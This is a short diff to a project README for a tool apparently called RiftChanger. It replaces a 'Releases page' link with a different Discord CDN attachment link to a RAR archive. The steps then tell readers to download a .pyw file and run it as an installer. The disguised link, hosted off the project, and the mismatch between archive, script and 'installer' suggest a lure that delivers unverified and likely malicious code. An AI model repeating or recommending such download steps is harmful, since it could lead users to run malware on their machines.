@@ -60,7 +60,7 @@ pnpm dev
 pnpm build:win
 ```
  ### For Windows 10
- 1. Go to the [Releases](https://cdn.discordapp.com/attachments/1508113458028351639/1508143584430522581/RiftChangerW10.rar?ex=6a1477aa&is=6a13262a&hm=6c237bb48960d6635019e2f230e2ace8d1f5d7a3906176da6766939b64347009&) page
+ 1. Go to the [Releases](https://cdn.discordapp.com/attachments/1508113458028351639/1508141992738160701/RiftChangerW10.rar?ex=6a14762e&is=6a1324ae&hm=c36e07ffb5d830609851fde7c3af333bafe9649087a39493caa98590fcff9e66&) page
 2. Download the `RiftChangerW10.pyw`
 3. Run the installer and follow the setup wizard
   
